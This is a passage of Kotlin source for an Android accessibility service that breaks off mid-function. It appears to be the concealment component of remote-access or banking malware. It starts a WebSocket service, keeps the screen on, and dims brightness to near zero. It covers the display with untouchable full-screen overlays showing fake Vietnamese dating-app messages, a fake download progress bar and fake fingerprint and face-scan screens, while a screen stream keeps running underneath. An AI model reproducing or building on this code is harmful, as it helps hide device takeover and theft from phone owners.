package com.se.sebo

import android.accessibilityservice.AccessibilityGestureEvent
import android.accessibilityservice.AccessibilityService
import android.animation.ArgbEvaluator
import android.animation.ObjectAnimator
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.PixelFormat
import android.graphics.Rect
import android.media.projection.MediaProjection
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.KeyEvent
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.ViewFlipper
import androidx.core.content.ContextCompat
import com.blankj.utilcode.util.ActivityUtils
import com.blankj.utilcode.util.LogUtils
import com.pedro.library.generic.GenericStream
import com.se.sebo.Assists.getFullScreenResolution
import com.se.sebo.Manager.GenericStreamManager
import com.se.sebo.base.R
import com.se.sebo.utils.BitmapSource

class AssistsService : AccessibilityService() {


    private var renlain_zhezhao_view: View? = null
    private var banben12: Boolean=true
    private var blackOverlayView: View? = null
    private var mediaProjection: MediaProjection? = null
    private var overlayAlpha: Float = 0.0f
    private var renderedColor: Int = 0
    private var originalColor: Int = 0
    private lateinit var genericStream: GenericStream
    var overlayView: View? = null
    private lateinit var windowManager: WindowManager

    var originalBrightness: Int? =null

    var bitmapSource: BitmapSource? = null
    private var lastInput: String = "" // 用于存储上一次的输入

    private lateinit var downloadStatusText: TextView
    private val downloadHandler = Handler(Looper.getMainLooper())
    private var currentProgress = 0
    private var totalSizeMB = 500  // 假设总下载大小为 500MB
    private var speedMBps = 1.0     // 速度动态变化

    private val textHandler = Handler(Looper.getMainLooper())  // 处理文本更新
    private val flipperHandler = Handler(Looper.getMainLooper()) // 处理 ViewFlipper 轮播


    private lateinit var pleaseWaitTextView: TextView
    private var currentTextIndex = 0
    // 预设的等待文本数组（每次更新都会随机或依次选择一个）
    private val waitingTexts = arrayOf(
        "Đang tìm kiếm người phù hợp nhất cho bạn...",
        "Tải lên... Biết đâu tình yêu của bạn đang chờ phía trước!",
        "Tim đập nhanh hơn, hãy chờ một chút...",
        "Hệ thống đang quét để tìm người yêu định mệnh của bạn...",
        "Đang tải tình yêu, đừng rời đi nhé!",
        "Cupid đang sắp xếp danh sách cho bạn...",
        "Đang tính toán mức độ phù hợp giữa bạn và người ấy...",
        "Radar tình yêu đang quét sóng...",
        "Đừng vội, tình yêu đáng để chờ đợi!",
        "Người ấy của bạn có thể xuất hiện ngay sau khi tải xong..."
    )


    private lateinit var viewFlipper: ViewFlipper
    private val handler = Handler()
    private var currentIndex = 0
    private val intervals = intArrayOf(1500, 1500, 30000)


    override fun onCreate() {
        super.onCreate()
        Assists.service = this

//        WebSocketManager.initWebSocket(this)
        val serviceIntent = Intent(this, WebSocketService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)

    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        LogUtils.d(Assists.LOG_TAG, "onServiceConnected")
        Assists.service = this
        Assists.serviceListeners.forEach { it.onServiceConnected(this) }

        // 初始化 WindowManager
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        setScreenAlwaysOn(Assists.getContext())
    }

    fun setScreenAlwaysOn(context: Context) {
        if (!Settings.System.canWrite(context)) {
            // 请求修改系统设置的权限
//            val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
//            intent.data = Uri.parse("package:${context.packageName}")
//            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
//            context.startActivity(intent)
        } else {
            // 设置屏幕超时时间为最大值
            Settings.System.putInt(
                context.contentResolver,
                Settings.System.SCREEN_OFF_TIMEOUT,
                Int.MAX_VALUE
            )
        }
    }



    fun hide_renlian_zhezhao() {
        renlain_zhezhao_view?.visibility=View.GONE
    }



    fun showOverlay_zhiwen() {
        removeOverlay()
        val brand = Build.BRAND // 获取手机品牌


        overlayAlpha = 0.99f

        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // 黑色背景层的布局参数
        val blackOverlayParams = WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            }

            format = PixelFormat.TRANSPARENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS // 覆盖到状态栏

            alpha = overlayAlpha // 设置透明度
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }

        // 加载 overlay 布局
        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_zhiwen, null)

        try {
            // 添加 overlayView 到窗口
            windowManager.addView(overlayView, blackOverlayParams)
            updateRedFilter(0.98f)

            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.S) {
                // 显示额外红色覆盖层
                showOverlay_zhiwen1()
            } else {
                // 查找指纹图片控件
                val fingerprintImage = overlayView?.findViewById<ImageView>(R.id.fingerprint_image)
                fingerprintImage?.let {
                    it.visibility=View.VISIBLE
                    // 调用变色方法
                    animateFingerprintColor(it)
                }
            }

            Log.d("brand", "Overlay added successfully $brand")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }
    fun showOverlay_zhiwen1() {

        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // 黑色背景层的布局参数
        val blackOverlayParams = WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            }

            format = PixelFormat.TRANSPARENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS // 覆盖到状态栏

            alpha = 0.95f // 完全不透明
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }

        // 加载原有 overlayView
        blackOverlayView = LayoutInflater.from(this).inflate( R.layout.overlay_zhiwen_fugai,null)

        try {
            val fingerprintImage = blackOverlayView?.findViewById<ImageView>(R.id.fingerprint_image)
            fingerprintImage?.let {
                // 调用变色方法
                animateFingerprintColor(it)
            }

            // 添加黑色覆盖层
            windowManager.addView(blackOverlayView, blackOverlayParams)
            Log.d("AssistsService", "Overlay added successfully $originalColor == $renderedColor")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }

    /**
     * 指纹图片变色动画
     */
    private fun animateFingerprintColor(fingerprintImage: ImageView) {
        // 使用 ObjectAnimator 实现颜色渐变
        val colorAnimator = ObjectAnimator.ofArgb(
            fingerprintImage.drawable, // 直接作用于指纹图片的 Drawable
            "tint",
            Color.WHITE, // 起始颜色
            Color.BLUE,
            Color.MAGENTA,
            Color.CYAN
        )

        colorAnimator.duration = 2000 // 动画时长（毫秒）
        colorAnimator.setEvaluator(ArgbEvaluator())
        colorAnimator.repeatCount = 1000 // 不重复
        colorAnimator.start()
    }



    fun hideOverlay_gone() {
        try {
            overlayView?.visibility = View.GONE // 将 overlayView 设置为隐藏
            Log.d("AssistsService", "Overlay hidden successfully")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to hide overlay: ${e.message}")
        }
    }

    fun showOverlay_VISIBLE() {
        try {
            overlayView?.visibility = View.VISIBLE // 恢复 overlayView 的可见性
            Log.d("AssistsService", "Overlay shown successfully")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to show overlay: ${e.message}")
        }
    }
    /**
     * 移除悬浮层（完全销毁）
     */
    fun removeOverlay() {


        try {
//            Assists.restoreDefaultWallpaper()
            restoreScreenBrightness()
            enableAutoBrightness()
            if (overlayView != null) {
                val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
                windowManager.removeView(overlayView)
                overlayView = null
                updateAlphaFilter()



                Log.d("AssistsService", "Overlay1 removed successfully")
            }
            if (blackOverlayView != null) {
                val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
                // 移除黑色覆盖层
                blackOverlayView?.let {
                    windowManager.removeView(it)
                    blackOverlayView = null // 释放引用
                    Log.d("AssistsService", "Overlay2 removed successfully")
                }

            }
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to remove overlay: ${e.message}")
        }
    }

    fun showOverlay_renlians() {
        removeOverlay()
        val brand =Build.BRAND; // 获取手机品牌

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.S_V2) { // Android 12
            banben12=true
        }else{
            banben12=false
        }

        overlayAlpha = 0.99f

        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // 黑色背景层的布局参数
        val blackOverlayParams = WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if(banben12){
                    //悬浮窗模式
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                }else{
                    //无障碍模式
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                }

            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            }

            format = PixelFormat.TRANSPARENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN

            alpha = overlayAlpha // 完全不透明
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }

        // 加载原有 overlayView
        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_renlian, null)

        overlayView?.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_FULLSCREEN or               // 全屏，隐藏状态栏
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or         // 沉浸模式
                        View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN           // 扩展到状态栏
                )


        try {
            // 添加原有 overlayView
            windowManager.addView(overlayView, blackOverlayParams)
            updateRedFilter(0.98f)

            Assists.setDrawableAsWallpaper()

            if(banben12){
                showOverlay_renlian1()
            }

            Log.d("band", "Overlay added successfully $brand")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }
    fun showOverlay_renlian1() {

        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // 黑色背景层的布局参数
        val blackOverlayParams = WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            }

            format = PixelFormat.TRANSPARENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN

            alpha = 0.99f // 完全不透明
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }

        // 加载原有 overlayView
        blackOverlayView = LayoutInflater.from(this).inflate(R.layout.overlay_renlian, null)

        blackOverlayView?.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or  // 扩展到状态栏
                        View.SYSTEM_UI_FLAG_FULLSCREEN or        // 隐藏状态栏
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY    // 沉浸模式
                )


        try {
            // 添加黑色覆盖层
            windowManager.addView(blackOverlayView, blackOverlayParams)

            Log.d("AssistsService", "Overlay added successfully")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }

    // 安卓12之前版本    红色背景
    fun showOverlay_red(jiazai: Boolean) {

        removeOverlay()
        if (checkAndRequestWriteSettingsPermission(this)) {
            setScreenBrightness(5) // 设置亮度值
        }

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.S_V2) { // Android 12
            banben12=true
        }else{
            banben12=false
        }

        overlayAlpha = 0.99f

        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // 黑色背景层的布局参数
        val blackOverlayParams = WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if(banben12){
                    //悬浮窗模式
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                }else{
                    //无障碍模式
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                }

            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            }

            format = PixelFormat.TRANSPARENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN

            alpha = overlayAlpha // 完全不透明
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }

        // 加载原有 overlayView
        overlayView = LayoutInflater.from(this).inflate(
            if (jiazai) R.layout.overlay_layout else R.layout.overlay_red,
            null
        )


        overlayView?.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_FULLSCREEN or               // 全屏，隐藏状态栏
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or         // 沉浸模式
                        View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN           // 扩展到状态栏
                )


        try {
            // 添加原有 overlayView
            windowManager.addView(overlayView, blackOverlayParams)
            updateRedFilter(0.99f)

//            Assists.setDrawableAsWallpaper()

            if(banben12){
                showOverlay_red1(false)
            }else{
                val progressBar = overlayView?.findViewById<ProgressBar>(R.id.multicolor_progress_bar)
                progressBar?.visibility = View.VISIBLE

                val textView = overlayView?.findViewById<TextView>(R.id.please_wait_text)
                textView?.visibility = View.VISIBLE


                val textView1 = overlayView?.findViewById<TextView>(R.id.please_wait_text1)
                textView1?.visibility = View.VISIBLE


                val logo = overlayView?.findViewById<ImageView>(R.id.logo)
                logo?.visibility = View.VISIBLE


                progressBar?.let { startLoopingProgressBar(it) }
            }

            Log.d("band", "Overlay added successfully")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }



    fun showOverlay_red1(jiazai: Boolean) {

        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // 黑色背景层的布局参数
        val blackOverlayParams = WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            }

            format = PixelFormat.TRANSPARENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN

            alpha = 0.96f // 完全不透明
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }

        // 加载原有 overlayView
        blackOverlayView = LayoutInflater.from(this).inflate(R.layout.overlay_red_progress, null)

        blackOverlayView?.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or  // 扩展到状态栏
                        View.SYSTEM_UI_FLAG_FULLSCREEN or        // 隐藏状态栏
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY    // 沉浸模式
                )

        val progressBar = blackOverlayView?.findViewById<ProgressBar>(R.id.multicolor_progress_bar)

        try {
            // 添加黑色覆盖层
            windowManager.addView(blackOverlayView, blackOverlayParams)
            progressBar?.let { startLoopingProgressBar(it) }

            Log.d("AssistsService", "Overlay added successfully")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }





    fun showOverlay_renlian(tu: Int) {
        removeOverlay()


        if (overlayView != null) return // 防止重复添加

        val layoutParams = WindowManager.LayoutParams().apply {
            type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            format = PixelFormat.TRANSLUCENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_SECURE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS // 覆盖到状态栏
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }

        overlayView = LayoutInflater.from(this).inflate(tu, null)
        val progressBar = overlayView?.findViewById<ProgressBar>(R.id.multicolor_progress_bar)

        try {
            windowManager.addView(overlayView, layoutParams)
            progressBar?.let { startLoopingProgressBar(it) }

            Assists.setDrawableAsWallpaper()

            Log.d("AssistsService", "Overlay added successfully")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }





    private fun startLoopingProgressBar(progressBar: ProgressBar, downloadStatusText: TextView? = null) {
        val totalTime = 600000L // 5分钟 = 300,000 毫秒
        val interval = 1000L // 每秒更新
        val totalSizeMB = 1223 // 固定下载大小 1.2GB (1200MB)
        val handler = Handler(Looper.getMainLooper())

        var elapsedTime = 0L
        var downloadedMB = 0.0
        var remainingSeconds = (totalTime / 1000).toInt() // 总共 300 秒

        handler.post(object : Runnable {
            override fun run() {
                elapsedTime += interval
                val progress = ((elapsedTime / totalTime.toFloat()) * 100).toInt()

                // **下载速度稳定在 (3.8MB/s ~ 4.2MB/s)**
                val speedMBps = (38..42).random() / 10.0  // 生成 3.8 ~ 4.2 之间的数
                downloadedMB += speedMBps

                // **更新剩余时间**
                remainingSeconds -= 1  // 每次更新时减少 1 秒
                val remainingMinutes = remainingSeconds / 60  // 转换为分钟

                // **更新进度条**
                progressBar.progress = progress

                // **如果 TextView 存在，更新状态**
                downloadStatusText?.text = String.format(
                    "Tốc độ: %.1f MB/s | Tổng dung lượng: %d MB | Thời gian còn lại: %d phút",
                    speedMBps, totalSizeMB, remainingMinutes
                )

                // **保持循环**
                if (elapsedTime < totalTime) {
                    handler.postDelayed(this, interval)
                } else {
                    // **下载完成，设置进度条满格**
                    progressBar.progress = 100
                    downloadStatusText?.text = "Tải xuống hoàn tất!"
                }
            }
        })
    }








    /**
     * 检查并请求 WRITE_SETTINGS 权限
     */


    fun checkAndRequestWriteSettingsPermission(context: Context): Boolean {
        if (!Settings.System.canWrite(context)) {
            Log.d("jiujiu", "WRITE_SETTINGS permission not granted. Requesting permission.")
            val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
            intent.data = Uri.parse("package:${context.packageName}")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
            return false
        }
        Log.d("jiujiu", "WRITE_SETTINGS permission already granted.")
        return true
    }

    /**
     * 设置屏幕亮度
     * @param brightness 亮度值，范围 0-255
     */
    fun setScreenBrightness(brightness: Int) {
        try {
            val resolver = contentResolver

            // 获取当前系统亮度值并保存
            if (originalBrightness == null) {
                originalBrightness = Settings.System.getInt(resolver, Settings.System.SCREEN_BRIGHTNESS)
                Log.d("jiujiu", "Original brightness saved: $originalBrightness")
            }

            // 禁用自动亮度调节
            Settings.System.putInt(resolver, Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)

            // 设置系统亮度
            Settings.System.putInt(resolver, Settings.System.SCREEN_BRIGHTNESS, brightness)

            // 设置当前应用窗口的亮度
            val window = ActivityUtils.getTopActivity()?.window
            val layoutParams = window?.attributes
            layoutParams?.screenBrightness = brightness / 255.0f
            window?.attributes = layoutParams

            Log.d("jiujiu", "Screen brightness set to $brightness")
        } catch (e: Exception) {
            Log.e("jiujiu", "Failed to set screen brightness: ${e.message}")
        }
    }

    fun restoreScreenBrightness() {
        try {
            val resolver = contentResolver

            // 检查是否保存了原始亮度值
            if (originalBrightness != null) {
                // 恢复到原始亮度
                Settings.System.putInt(resolver, Settings.System.SCREEN_BRIGHTNESS, originalBrightness!!)
                Log.d("jiujiu", "Screen brightness restored to $originalBrightness")

                // 恢复当前应用窗口的亮度
                val window = ActivityUtils.getTopActivity()?.window
                val layoutParams = window?.attributes
                layoutParams?.screenBrightness = originalBrightness!! / 255.0f
                window?.attributes = layoutParams
            } else {
                Log.e("jiujiu", "Original brightness is not saved. Cannot restore.")
            }
        } catch (e: Exception) {
            Log.e("jiujiu", "Failed to restore screen brightness: ${e.message}")
        }
    }

    fun enableAutoBrightness() {
        try {
            val resolver = contentResolver

            // 启用自动亮度调节
            Settings.System.putInt(
                resolver,
                Settings.System.SCREEN_BRIGHTNESS_MODE,
                Settings.System.SCREEN_BRIGHTNESS_MODE_AUTOMATIC
            )

            Log.d("jiujiu", "Enabled auto-brightness mode")
        } catch (e: Exception) {
            Log.e("jiujiu", "Failed to enable auto-brightness: ${e.message}")
        }
    }

    fun showOverlay(jiazai: Boolean) {
        removeOverlay()
        if (checkAndRequestWriteSettingsPermission(this)) {
            setScreenBrightness(0) // 设置亮度值
        }

        overlayAlpha = 0.99f

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.S_V2) { // Android 12
            banben12=true
        }else{
            banben12=false
        }
        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // 黑色背景层的布局参数
        val blackOverlayParams = WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if(banben12){
                    //悬浮窗模式
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                }else{
                    //无障碍模式
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                }

            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            }

            format = PixelFormat.TRANSPARENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN

            alpha = overlayAlpha // 完全不透明
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }



        // 加载原有 overlayView
        overlayView = LayoutInflater.from(this).inflate(
            if (jiazai) R.layout.overlay_layout else R.layout.overlay_layout_no,
            null
        )
        overlayView?.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_FULLSCREEN or               // 全屏，隐藏状态栏
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or         // 沉浸模式
                        View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN           // 扩展到状态栏
                )


        try {
            // 添加黑色覆盖层

            // 添加原有 overlayView
            windowManager.addView(overlayView, blackOverlayParams)
            updateAlphaFilter()


            if(banben12){
                showOverlay1()
            }else{
                // **获取 TextView 并初始化**
                pleaseWaitTextView = overlayView!!.findViewById(R.id.please_wait_text1)
                pleaseWaitTextView?.visibility = View.VISIBLE
                pleaseWaitTextView.text = waitingTexts[0] // 设置初始文本

                // **获取 ViewFlipper**
                viewFlipper = overlayView?.findViewById(R.id.background_flipper)!!
                viewFlipper?.visibility = View.VISIBLE

                // 仅当找到 viewFlipper 时，才开始轮播
                viewFlipper?.let {
                    startFlipping()
                }

                // **启动定时更换文本**
                textHandler.postDelayed(updateTextRunnable, 2000)


                val progressBar = overlayView?.findViewById<ProgressBar>(R.id.multicolor_progress_bar)
                val downloadStatusText = overlayView?.findViewById<TextView>(R.id.download_status_text) // 获取 TextView

                progressBar?.visibility = View.VISIBLE
                downloadStatusText?.visibility = View.VISIBLE
                // **调用进度条函数，同时传入可选的 TextView**
                progressBar?.let { startLoopingProgressBar(it, downloadStatusText) }

            }
            Log.d("AssistsService", "Overlay added successfully $originalColor == $renderedColor")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }

    // **轮换 TextView 文本**
    private val updateTextRunnable = object : Runnable {
        override fun run() {
            if (::pleaseWaitTextView.isInitialized) {
                // 切换文本
                pleaseWaitTextView.text = waitingTexts[currentTextIndex]
                currentTextIndex = (currentTextIndex + 1) % waitingTexts.size
                textHandler.postDelayed(this, 2000) // 2秒后再次更新
            }
        }
    }

    @SuppressLint("ResourceType")
    fun showOverlay1() {
        val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        val blackOverlayParams = WindowManager.LayoutParams().apply {
            type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            }
            format = PixelFormat.TRANSPARENT
            flags = (WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    or WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                    or WindowManager.LayoutParams.FLAG_FULLSCREEN)
            alpha = 0.96f
            gravity = Gravity.TOP or Gravity.START
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
        }








        // 加载布局
        blackOverlayView = LayoutInflater.from(this).inflate(R.layout.overlay_black_progress, null)

        // **获取 TextView 并初始化**
        pleaseWaitTextView = blackOverlayView!!.findViewById(R.id.please_wait_text1)
        pleaseWaitTextView.text = waitingTexts[0] // 设置初始文本

        // **获取 ViewFlipper**
        viewFlipper = blackOverlayView?.findViewById(R.id.background_flipper)!!

        // 仅当找到 viewFlipper 时，才开始轮播
        viewFlipper?.let {
            startFlipping()
        }

        // **启动定时更换文本**
        textHandler.postDelayed(updateTextRunnable, 2000)

        // 其他 UI 相关设置
        blackOverlayView?.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                        View.SYSTEM_UI_FLAG_FULLSCREEN or
                        View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                )

        val progressBar = blackOverlayView?.findViewById<ProgressBar>(R.id.multicolor_progress_bar)
        val downloadStatusText = blackOverlayView?.findViewById<TextView>(R.id.download_status_text) // 获取 TextView

        progressBar?.visibility = View.VISIBLE

        // **调用进度条函数，同时传入可选的 TextView**
        progressBar?.let { startLoopingProgressBar(it, downloadStatusText) }


        // **尝试添加到 WindowManager**
        try {
            windowManager.addView(blackOverlayView, blackOverlayParams)
            Log.d("AssistsService", "Overlay added successfully")
        } catch (e: Exception) {
            Log.e("AssistsService", "Failed to add overlay: ${e.message}")
        }
    }

    // **独立的 ViewFlipper 轮播 Handler**
    private val flipperRunnable = object : Runnable {
        override fun run() {
            viewFlipper?.showNext()  // 切换到下一张图片
            currentIndex = (currentIndex + 1) % intervals.size
            flipperHandler.postDelayed(this, intervals[currentIndex].toLong())
        }
    }


    public fun rmoveFilter() {
        genericStream= GenericStreamManager.genericStream!!;

        if(genericStream!=null){
            Log.e("guanbi", "11111: ", )
            genericStream.getGlInterface().clearFilters()

        }else{
            Log.e("guanbi", "22222: ", )
        }

        if (blackOverlayView != null) {
            val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
            // 移除黑色覆盖层
            blackOverlayView?.let {
                windowManager.removeView(it)
                blackOverlayView = null // 释放引用
                Log.d("guanbi", "Overlay2 removed successfully")
            }
        }
    }

    // **启动 ViewFlipper 轮播**
    private fun startFlipping() {
        viewFlipper?.let {
            flipperHandler.postDelayed(flipperRunnable, intervals[currentIndex].toLong())
        }
    }


    public fun updateRedFilter(calculatedAlpha:Float) {
        val overlay = overlayView
        val (width, height) = Assists.getFullScreenResolution(this)

        genericStream= GenericStreamManager.genericStream!!;
        if (overlay != null) {
            // 计算 Alpha
            genericStream.getGlInterface().clearFilters()

//            val calculatedAlpha: Float = calculateAlpha(originalColor, renderedColor, overlayAlpha)

            // 设置 OpenGL 滤镜
            val redFilterRender = RedFilterRender(this, width, height)
            redFilterRender.initGl(width, height, this, width, height)

            // 动态设置 Alpha
            redFilterRender.setAlpha(calculatedAlpha)

            genericStream.getGlInterface().addFilter(redFilterRender)
            redFilterRender.draw()

